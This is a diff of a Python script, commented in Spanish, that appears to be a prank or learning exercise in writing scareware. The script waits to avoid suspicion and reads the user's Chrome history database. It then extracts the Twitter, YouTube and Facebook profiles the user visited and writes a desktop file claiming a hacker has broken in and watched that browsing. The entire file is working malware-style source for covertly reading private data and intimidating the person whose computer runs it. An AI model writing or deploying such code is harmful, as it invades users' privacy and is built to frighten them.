@@ -1,79 +1,100 @@
-import os
+#Importamos las librerias necesarias
 import random
 import sqlite3
-import time
+from pathlib import Path
+from time import sleep
+from random import randrange
+import re
+
+#Definimos el nombre del archivo para asustar
+HACKER_FILE_NAME = "LEEME.txt"
 
 
-USER_DISK = os.path.splitdrive((os.getcwd())) [0]
+def get_user_path():
+    #Devolvemos nuestro disco mas la direccion de nuestro usuario
+    user_path = "{}/".format(Path.home())
+    return user_path
+
+
+def delay_action():
+    #Dormimos un numero de horas y minutos aleatorios para no velantar sospechas
+    number_of_hours = randrange(1, 4)
+    number_of_minutes = random.randint(1, 60)
+    print("Durmiendo {} horas y {} minutos.".format(number_of_hours, number_of_minutes))
+    sleep(3)
+
+
+def create_hacker_file(user_path):
+    try:
+        hacker_file = open(user_path + "Desktop\\" + HACKER_FILE_NAME, "w")
+        hacker_file.write("Hola crack! Soy un ñaker y me he colado en tu sistema \n")
+        hacker_file.close()
+        return hacker_file
+    except:
+        hacker_file = open(HACKER_FILE_NAME, "w")
+        hacker_file.write("Hola crack! Soy un ñaker y me he colado en tu sistema \n")
+        hacker_file.close()
+        return hacker_file
 
 
 def get_chrome_history(user_path):
-    database_content = False
-    while not database_content:
+    urls = None
+    while not urls:
         try:
-            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
+            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
             connection = sqlite3.connect(history_path)
             cursor = connection.cursor()
             cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
             urls = cursor.fetchall()
-            print(urls)
             connection.close()
-            database_content = True
-
             return urls
         except sqlite3.OperationalError:
-            print("Error al abrir la base de datos... Se volvera a intentar en 15 segundos...")
-            time.sleep(15)
+            print("Historial inaccesible, reintentando en 3 segundos...")
+            sleep(3)
 
 
-def create_hack_file(user_path):
+def check_visited_profiles_and_scare_user(hacker_file, chrome_history, user_path):
+    profiles_visited = []
+    for item in chrome_history:
+        results_of_twitter = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
+        results_of_youtube = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
+        results_of_facebook = re.findall("https://www.facebook.com/([A-Za-z0-9]+)$", item[2])
+
+        results = []
+        for result in results_of_twitter:
+            results.append(result)
+        for result in results_of_youtube:
+            results.append(result)
+        for result in results_of_facebook:
+            results.append(result)
+
+        if results and results[0] not in ["notificacions", "home"] and results[0] not in profiles_visited:
+            profiles_visited.append(results[0])
     try:
-        hacker_file = open(user_path + "\\desktop\\" + "LEEME.txt", "w")
-        hacker_file.write("Tu PC ha sido infectado\n")
+        hacker_file = open(user_path + "Desktop\\" + HACKER_FILE_NAME, "a")
+        hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
         hacker_file.close()
-        return hacker_file
-
     except:
-        hacker_file = open("LEEME.txt", "w")
-        hacker_file.write("Tu PC ha sido infectado\n")
+        hacker_file = open(HACKER_FILE_NAME, "a")
+        hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(", ".join(profiles_visited)))
         hacker_file.close()
-        return hacker_file
-
-
-def delay_action():
-    n_hours = random.randrange(1, 4)
-    n_minutes = random.randrange(1, 60)
-    print("Durmiendo {} horas y {} minutos".format(n_hours, n_minutes))
-    total_seconds = n_hours * 3600 + n_minutes * 60
-    time.sleep(3)
-
-
-def check_history_and_scare_user (hacker_file, chrome_history):
-    for item in chrome_history[:10]:
-        user_path = USER_DISK + "\\Users\\" + os.getlogin()
-        try:
-            hacker_file = open(user_path + "\\desktop\\" + "LEEME.txt", "a")
-            hacker_file.write("he visto que has visitado la web {}, es algo interesante...\n".format(item[0]))
-            hacker_file.close()
-        except:
-            hacker_file = open("LEEME.txt", "a")
-            hacker_file.write("he visto que has visitado la web {}, es algo interesante...\n".format(item[0]))
-            hacker_file.close()
-
-
 
 
 def main():
-    #Esperamos unas horas para no levantar sospechas
+    # Esperamos entre 1-3 horas para no levantar sospechas
     delay_action()
-    #Definimos la ruta del usuario
-    user_path = USER_DISK + "\\Users\\" + os.getlogin()
-    #Creamos un archivo
-    hacker_file = create_hack_file(user_path)
-    #Recojemos su historial
+
+    # Calculamos la ruta del usuario de windows
+    user_path = get_user_path()
+
+    # Recogemos su historial de Google Chrome (cuando sea posible)
     chrome_history = get_chrome_history(user_path)
-    #Escribimos mensajitos de miedo
-    check_history_and_scare_user (hacker_file, chrome_history)
+
+    # Creamos un archivo en el escritorio
+    hacker_file = create_hacker_file(user_path)
+
+    # Escribiendo mensajes de miedo
+    check_visited_profiles_and_scare_user(hacker_file, chrome_history, user_path)
 
 
 if __name__ == "__main__":
